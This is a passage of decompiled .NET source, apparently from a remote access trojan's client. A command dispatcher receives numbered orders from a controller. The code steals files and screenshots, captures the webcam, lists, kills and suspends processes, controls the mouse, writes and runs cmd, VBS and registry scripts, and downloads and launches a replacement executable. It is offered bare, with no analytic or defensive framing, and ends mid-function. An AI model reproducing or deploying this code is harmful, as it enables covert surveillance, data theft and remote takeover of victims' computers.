						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num22, C }, (string[])null, true, false);
						Process.Start(fileName);
					}
					catch (Exception ex15)
					{
						ProjectData.SetProjectError(ex15, num2);
						ProjectData.ClearProjectError();
					}
				}
				break;
			}
			case "#12":
			{
				ER = 1;
				object[] array12 = new object[1];
				object[] array22 = array12;
				int num5 = 1;
				array22[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
				string text14 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				Array array23 = Strings.Split(text14, "\r\n", -1, (CompareMethod)0);
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array23, new object[1] { 3 }, (string[])null), (object)"DIR", false))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array23, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array23, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array23, new object[1] { 2 }, (string[])null)));
				}
				else
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array23, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array23, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array23, new object[1] { 2 }, (string[])null)));
				}
				break;
			}
			case "#13":
			{
				ER = 1;
				int num17 = array.Length - 1;
				for (int num18 = 1; num18 <= num17; num18++)
				{
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num18 }, (string[])null));
					string path6 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num18, C }, (string[])null, true, false);
					if (Directory.Exists(path6))
					{
						try
						{
							string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num18 }, (string[])null));
							string path7 = API.DEB(ref S);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num18, S }, (string[])null, true, false);
							Directory.Delete(path7, recursive: true);
						}
						catch (Exception ex11)
						{
							ProjectData.SetProjectError(ex11, num2);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						try
						{
							C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num18 }, (string[])null));
							string path8 = API.DEB(ref C);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num18, C }, (string[])null, true, false);
							File.Delete(path8);
						}
						catch (Exception ex12)
						{
							ProjectData.SetProjectError(ex12, num2);
							ProjectData.ClearProjectError();
						}
					}
				}
				break;
			}
			case "#14":
			{
				ER = 1;
				object[] array12 = new object[1];
				object[] array21 = array12;
				int num5 = 1;
				array21[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
				string text13 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				FileSystem.MkDir(text13);
				break;
			}
			case "#15":
			{
				ER = 1;
				int num15 = array.Length - 1;
				for (int num16 = 1; num16 <= num15; num16++)
				{
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num16 }, (string[])null));
					string text11 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num16, C }, (string[])null, true, false);
					Array array19 = Strings.Split(text11, "\r\n", -1, (CompareMethod)0);
					if (Directory.Exists(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array19, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array19, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0)))
					{
						Directory.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array19, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array19, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array19, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array19, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
					}
					else
					{
						File.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array19, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array19, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array19, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array19, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
					}
				}
				break;
			}
			case "#16":
			{
				ER = 1;
				B b4 = MyProject.Forms.B;
				string text10 = "#11" + Y;
				object[] array17 = new object[1];
				object[] array18 = array17;
				int num5 = 1;
				array18[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array17, (string[])null));
				string path5 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				string S = File.ReadAllText(path5);
				string T = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text10 + API.ENB(ref S), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)));
				b4.SEND(ref T);
				break;
			}
			case "#17":
			{
				ER = 1;
				object[] array2 = new object[1];
				object[] array11 = array2;
				int num5 = 1;
				array11[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string path4 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				object[] array12 = new object[1];
				object[] array13 = array12;
				int num6 = 2;
				array13[0] = 2;
				string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
				string contents = API.DEB(ref S);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, S }, (string[])null, true, false);
				File.WriteAllText(path4, contents);
				break;
			}
			case "#18":
			{
				ER = 1;
				object[] array2 = new object[1];
				object[] array10 = array2;
				int num5 = 1;
				array10[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string path3 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				File.Create(path3);
				break;
			}
			case "#19":
			{
				ER = 1;
				MemoryStream memoryStream3 = new MemoryStream();
				int num3 = Strings.InStr(@string, Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), (CompareMethod)0) + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length + Y.Length - 1;
				int num4 = Da.Length - 1;
				for (int j = num3; j <= num4; j++)
				{
					memoryStream3.WriteByte(Da[j]);
				}
				object[] array2 = new object[1];
				object[] array3 = array2;
				int num5 = 1;
				array3[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string path = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				byte[] byt = memoryStream3.ToArray();
				bool Compress = false;
				File.WriteAllBytes(path, API.ZIP(byt, ref Compress));
				break;
			}
			case "#20":
			{
				ER = 1;
				object[] array2 = new object[1];
				object[] array67 = array2;
				int num5 = 1;
				array67[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string text45 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				Array array68 = Strings.Split(text45, "\\", -1, (CompareMethod)0);
				MemoryStream memoryStream14 = new MemoryStream();
				byte[] array69 = (byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)("#12" + Y), NewLateBinding.LateIndexGet((object)array68, new object[1] { array68.Length - 1 }, (string[])null)), (object)Y) }, (string[])null, (Type[])null, (bool[])null);
				memoryStream14.Write(array69, 0, array69.Length);
				array2 = new object[1];
				object[] array70 = array2;
				num5 = 1;
				array70[0] = 1;
				C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string path17 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				byte[] byt4 = File.ReadAllBytes(path17);
				bool Compress = true;
				array69 = API.ZIP(byt4, ref Compress);
				memoryStream14.Write(array69, 0, array69.Length);
				array69 = null;
				MyProject.Forms.B.WC.SendData(memoryStream14.ToArray());
				memoryStream14.Dispose();
				break;
			}
			case "#21":
			{
				ER = 1;
				int num40 = array.Length - 1;
				for (int num41 = 1; num41 <= num40; num41++)
				{
					Thread.Sleep(10);
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num41 }, (string[])null));
					string text42 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num41, C }, (string[])null, true, false);
					Image val8 = (Image)new Bitmap(text42);
					val8.Dispose();
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num41 }, (string[])null));
					string text43 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num41, C }, (string[])null, true, false);
					Array array63 = Strings.Split(text43, "\\", -1, (CompareMethod)0);
					B b25 = MyProject.Forms.B;
					string[] array37 = new string[5] { "#13", Y, null, null, null };
					string[] array64 = array37;
					object[] array12 = new object[1];
					object[] array65 = array12;
					int num5 = array63.Length - 1;
					array65[0] = num5;
					string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array63, array12, (string[])null));
					string text44 = API.ENB(ref S);
					NewLateBinding.LateIndexSetComplex((object)array63, new object[2] { num5, S }, (string[])null, true, false);
					array64[2] = text44;
					array37[3] = Y;
					string[] array66 = array37;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num41 }, (string[])null));
					string path16 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num41, C }, (string[])null, true, false);
					array66[4] = API.FEN(File.ReadAllBytes(path16));
					string T = string.Concat(array37);
					b25.SEND(ref T);
				}
				break;
			}
			case "#22":
			{
				ER = 1;
				Process[] processes = Process.GetProcesses();
				string text39 = default(string);
				foreach (Process process2 in processes)
				{
					try
					{
						text39 = text39 + Y + process2.MainModule!.ModuleName + "*" + Conversions.ToString(process2.Id);
					}
					catch (Exception ex21)
					{
						ProjectData.SetProjectError(ex21, num2);
						text39 = text39 + Y + process2.ProcessName + "*" + Conversions.ToString(process2.Id);
						ProjectData.ClearProjectError();
					}
				}
				B b23 = MyProject.Forms.B;
				string C = "#14" + text39;
				b23.SEND(ref C);
				text39 = "";
				break;
			}
			case "#23":
			{
				ER = 1;
				int num34 = array.Length - 1;
				for (int num35 = 1; num35 <= num34; num35++)
				{
					Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num35 }, (string[])null))).Kill();
				}
				break;
			}
			case "#24":
			{
				try
				{
					chat.clos = true;
				}
				catch (Exception ex19)
				{
					ProjectData.SetProjectError(ex19, num2);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(100);
				object[] array2 = new object[1];
				object[] array56 = array2;
				int num5 = 1;
				array56[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				string cht = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				B.Cht = cht;
				break;
			}
			case "#25":
				ER = 0;
				if (((Control)B.Chat).get_InvokeRequired())
				{
					indd indd = inddd;
					object[] array2 = new object[1];
					object[] array50 = array2;
					int num5 = 1;
					array50[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string text32 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					string text33 = text32;
					((Control)B.Chat).Invoke((Delegate)indd, new object[1] { text33 });
				}
				else
				{
					RichTextBox t = B.Chat.T1;
					string[] array37 = new string[5]
					{
						t.get_Text(),
						MyProject.Forms.chat.nick,
						" : ",
						null,
						null
					};
					string[] array51 = array37;
					object[] array2 = new object[1];
					object[] array52 = array2;
					int num5 = 1;
					array52[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string text34 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					array51[3] = text34;
					array37[4] = "\r\n";
					t.set_Text(string.Concat(array37));
				}
				break;
			case "#26":
				ER = 0;
				chat.clos = true;
				break;
			case "#27":
			{
				ER = 1;
				int num32 = 0;
				string s = default(string);
				do
				{
					if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num32), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
					{
						try
						{
							FileSystem.Kill(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num32), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
							s = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num32), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
						}
						catch (Exception ex18)
						{
							ProjectData.SetProjectError(ex18, num2);
							ProjectData.ClearProjectError();
							goto IL_2ef7;
						}
					}
					else
					{
						s = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num32), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					}
					break;
					IL_2ef7:
					num32++;
				}
				while (num32 <= 9999);
				string C;
				switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.ToLower())
				{
				case "cmd":
				{
					string path15 = s;
					object[] array17 = new object[1];
					object[] array45 = array17;
					int num5 = 2;
					array45[0] = 2;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array17, (string[])null));
					string contents5 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
					File.WriteAllText(path15, contents5);
					Interaction.Shell(s, (AppWinStyle)0, false, -1);
					break;
				}
				case "vbs":
				{
					string path14 = s;
					object[] array2 = new object[1];
					object[] array44 = array2;
					int num5 = 2;
					array44[0] = 2;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string contents4 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
					File.WriteAllText(path14, contents4);
					Process.Start(s);
					break;
				}
				case "Reg":
				{
					string path13 = s;
					object[] array2 = new object[1];
					object[] array43 = array2;
					int num5 = 2;
					array43[0] = 2;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string contents3 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
					File.WriteAllText(path13, contents3);
					Interaction.Shell(s, (AppWinStyle)2, false, -1);
					break;
				}
				default:
				{
					string path12 = s;
					object[] array2 = new object[1];
					object[] array42 = array2;
					int num5 = 2;
					array42[0] = 2;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string contents2 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
					File.WriteAllText(path12, contents2);
					Process.Start(s);
					break;
				}
				}
				B b15 = MyProject.Forms.B;
				C = "#10" + Y + "^" + Conversions.ToString(4) + Y + API.ENB(ref s);
				b15.SEND(ref C);
				break;
			}
			case "#28":
			{
				ER = 1;
				object obj3 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
				if (Operators.ConditionalCompareObjectEqual(obj3, (object)"!", false))
				{
					B b11 = MyProject.Forms.B;
					string y = Y;
					string C = "plugin.C";
					string S = "W";
					object P = new object[0];
					string T = Conversions.ToString(global::n.C.inv(ref global::n.C.Plug, ref C, ref S, ref P));
					string p = "#17" + y + API.ENB(ref T);
					b11.SEND(ref p);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj3, (object)"@", false))
				{
					int num20 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null));
					string S = "plugin.C";
					string T = "CW";
					object[] array12 = new object[2] { num20, null };
					object[] array27 = array12;
					object[] array2 = new object[1];
					object[] array28 = array2;
					int num5 = 3;
					array28[0] = 3;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string text16 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, C }, (string[])null, true, false);
					array27[1] = text16;
					object P = array12;
					global::n.C.inv(ref global::n.C.Plug, ref S, ref T, ref P);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj3, (object)"#", false))
				{
					object[] array2 = new object[1];
					object[] array29 = array2;
					int num5 = 2;
					array29[0] = 2;
					int num6 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					object[] array12 = new object[1];
					object[] array30 = array12;
					int q = 3;
					array30[0] = 3;
					int num14 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
					API.wd.G(ref num6, ref num14);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, num14 }, (string[])null, true, false);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, num6 }, (string[])null, true, false);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj3, (object)"$", false))
				{
					MemoryStream memoryStream8 = new MemoryStream();
					object[] array2 = new object[1];
					object[] array31 = array2;
					int num14 = 2;
					array31[0] = 2;
					int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					Image obj4 = global::n.C.Capture(ref q);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, q }, (string[])null, true, false);
					obj4.Save((Stream)memoryStream8, ImageFormat.get_Jpeg());
					MemoryStream memoryStream9 = new MemoryStream();
					memoryStream9.Write(MyProject.Forms.B.WC.STB("#18" + Y), 0, MyProject.Forms.B.WC.STB("#18" + Y).Length);
					memoryStream9.Write(memoryStream8.ToArray(), 0, memoryStream8.ToArray().Length);
					MyProject.Forms.B.WC.SendData(memoryStream9.ToArray());
					memoryStream8.Dispose();
					memoryStream9.Dispose();
					MyProject.Forms.B = null;
				}
				break;
			}
			case "#29":
			{
				ER = 0;
				B b9 = MyProject.Forms.B;
				string C = "#Bla";
				b9.SEND(ref C);
				int num19 = 0;
				string text15 = default(string);
				do
				{
					if (File.Exists(Interaction.Environ("temp") + "\\" + Conversions.ToString(num19) + ".exe"))
					{
						try
						{
							File.Delete(Interaction.Environ("temp") + "\\" + Conversions.ToString(num19) + ".exe");
							text15 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num19) + ".exe";
						}
						catch (Exception ex14)
						{
							ProjectData.SetProjectError(ex14, num2);
							ProjectData.ClearProjectError();
							goto IL_35a2;
						}
					}
					else
					{
						text15 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num19) + ".exe";
					}
					break;
					IL_35a2:
					num19++;
				}
				while (num19 <= 999);
				string path9 = text15;
				byte[] byt2 = API.FDE(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
				bool Compress = false;
				File.WriteAllBytes(path9, API.ZIP(byt2, ref Compress));
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = text15;
				processStartInfo.Arguments = "!0@" + Application.get_ExecutablePath() + "@" + B.SU + "@" + Conversions.ToString(Process.GetCurrentProcess().Id);
				Process.Start(processStartInfo);
				ProjectData.EndApp();
				break;
			}
			case "#30":
				try
				{
					object[] array2 = new object[1];
					object[] array24 = array2;
					int num14 = 1;
					array24[0] = 1;
					int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					byte[] array25 = sc.gc(ref q);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, q }, (string[])null, true, false);
					byte[] array26 = array25;
					MemoryStream memoryStream7 = new MemoryStream();
					memoryStream7.Write(Encoding.Default.GetBytes("#19" + Y), 0, Encoding.Default.GetBytes("#19" + Y).Length);
					memoryStream7.Write(array26, 0, array26.Length);
					MyProject.Forms.B.WC.SendData(memoryStream7.ToArray());
					break;
				}
				catch (Exception ex13)
				{
					ProjectData.SetProjectError(ex13, num2);
					ProjectData.ClearProjectError();
					break;
				}
			case "#31":
				ER = 0;
				if (!B.Busy)
				{
					B.Busy = true;
					B b8 = MyProject.Forms.B;
					string C = "#16" + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width) + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
					b8.SEND(ref C);
					B.Busy = false;
				}
				break;
			case "#32":
			{
				ER = 0;
				Point position = new Point(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
				Cursor.set_Position(position);
				object obj2 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
				if (Operators.ConditionalCompareObjectEqual(obj2, (object)0, false))
				{
					mouse_event(8, 0, 0, 0, 1);
					mouse_event(16, 0, 0, 0, 1);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj2, (object)1, false))
				{
					mouse_event(2, 0, 0, 0, 1);
					mouse_event(4, 0, 0, 0, 1);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj2, (object)2, false))
				{
					mouse_event(2, 0, 0, 0, 1);
					mouse_event(4, 0, 0, 0, 1);
					mouse_event(2, 0, 0, 0, 1);
					mouse_event(4, 0, 0, 0, 1);
				}
				break;
			}
			case "#33":
			{
				B b5 = MyProject.Forms.B;
				string C = "#5" + Y + API.Gt();
				b5.SEND(ref C);
				break;
			}
			case "#34":
			{
				ER = 0;
				object[] array2 = new object[1];
				object[] array14 = array2;
				int num14 = 1;
				array14[0] = 1;
				int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
				byte[] array15 = global::n.C.Capture1(ref q);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, q }, (string[])null, true, false);
				byte[] array16 = array15;
				if (array16.Length != 0)
				{
					MemoryStream memoryStream6 = new MemoryStream();
					memoryStream6.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
					memoryStream6.Write(array16, 0, array16.Length);
					MyProject.Forms.B.WC.SendData(memoryStream6.ToArray());
				}
				break;
			}
			case "#35":
			{
				int num12 = array.Length - 1;
				for (int num13 = 1; num13 <= num12; num13++)
				{
					NTSuspendProcess.SuspendProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num13 }, (string[])null)));
				}
				break;
			}
			case "#36":
			{
				int num10 = array.Length - 1;
				for (int num11 = 1; num11 <= num10; num11++)
				{
					NTSuspendProcess.ResumeProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num11 }, (string[])null)));
				}
				break;
			}
			case "#37":
			{
				CamLoad();
				string C = "Cam.Cam";
				string S = "Dnames";
				object P = null;
				string text9 = Conversions.ToString(global::n.C.inv(ref cdll, ref C, ref S, ref P));
				B b3 = MyProject.Forms.B;
				C = "#22" + Y + text9;
				b3.SEND(ref C);
				break;
			}
			case "#38":
			{
				CamLoad();
				int num9 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
				string C = "Cam.Cam";
				string S = "Cam";
				object P = new object[3]
				{
					num9,
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)),
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null))
				};
				Image val2 = (Image)global::n.C.inv(ref cdll, ref C, ref S, ref P);
				MemoryStream memoryStream4 = new MemoryStream();
				val2.Save((Stream)memoryStream4, ImageFormat.get_Jpeg());
				MemoryStream memoryStream5 = new MemoryStream();
				memoryStream5.Write(MyProject.Forms.B.WC.STB("#23" + Y), 0, MyProject.Forms.B.WC.STB("#23" + Y).Length);
				memoryStream5.Write(memoryStream4.ToArray(), 0, memoryStream4.ToArray().Length);
				MyProject.Forms.B.WC.SendData(memoryStream5.ToArray());
				break;
			}
			case "#39":
			{
				CamLoad();
				string C = "Cam.Cam";
				string S = "Dnames";
				object P = null;
				string text = Conversions.ToString(global::n.C.inv(ref cdll, ref C, ref S, ref P));
				if (Operators.CompareString(text, "", false) == 0)
				{
					break;
				}
				int num = Strings.Split(text, "\r\n", -1, (CompareMethod)0).Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						string text2 = Strings.Split(text, "\r\n", -1, (CompareMethod)0)[i];
						C = "Cam.Cam";
						S = "Cam";
						P = new object[3] { 5, text2, "160x120" };
						Image val = (Image)global::n.C.inv(ref cdll, ref C, ref S, ref P);
						MemoryStream memoryStream = new MemoryStream();
						val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						MemoryStream memoryStream2 = new MemoryStream();
						memoryStream2.Write(MyProject.Forms.B.WC.STB("#24" + Y), 0, MyProject.Forms.B.WC.STB("#24" + Y).Length);
						memoryStream2.Write(memoryStream.ToArray(), 0, memoryStream.ToArray().Length);
						MyProject.Forms.B.WC.SendData(memoryStream2.ToArray());
						return;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex, num2);
						ProjectData.ClearProjectError();
					}
					Thread.Sleep(1000);
				}
				B b = MyProject.Forms.B;
				C = "#25";
				b.SEND(ref C);
				break;
			}
			}
		}
		catch (Exception ex24)
		{
			ProjectData.SetProjectError(ex24, num2);
			Exception ex25 = ex24;
			B.Busy = false;
			B b26 = MyProject.Forms.B;
			string[] array37 = new string[6]
			{
				"#10",
				Y,
				"^",
				Conversions.ToString(ER),
				Y,
				null
			};
			string[] array71 = array37;
			string C = ex25.Message;
			array71[5] = API.ENB(ref C);
			string S = string.Concat(array37);
			b26.SEND(ref S);
			ER = 0;
			ProjectData.ClearProjectError();
		}
	}

	public static void CamLoad()
	{
		if (!File.Exists(Application.get_StartupPath() + "\\DShowNet.dll"))
		{
			string path = Application.get_StartupPath() + "\\DShowNet.dll";
			byte[] dShowNET = Resources.DShowNET;
			bool Compress = false;
			File.WriteAllBytes(path, API.ZIP(dShowNET, ref Compress));
		}
		if (!File.Exists(Application.get_StartupPath() + "\\DirectX.Capture.dll"))
		{
			string path2 = Application.get_StartupPath() + "\\DirectX.Capture.dll";
			byte[] directX = Resources.DirectX;
			bool Compress = false;
			File.WriteAllBytes(path2, API.ZIP(directX, ref Compress));
		}
	}

	public static string siz(string Size)
	{
		if (Size.Length < 4)
		{
			return Size + " Bytes";
		}
		string text = Conversions.ToString(Conversions.ToDouble(Size) / 1024.0);
		string text2 = " KB";
		int num = default(int);
		if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
		{
			Array array = Strings.Split(text, ".", -1, (CompareMethod)0);
			text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null));
			num = ((NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), 1, 3)));
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " MB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array2 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " GB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array3 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null));
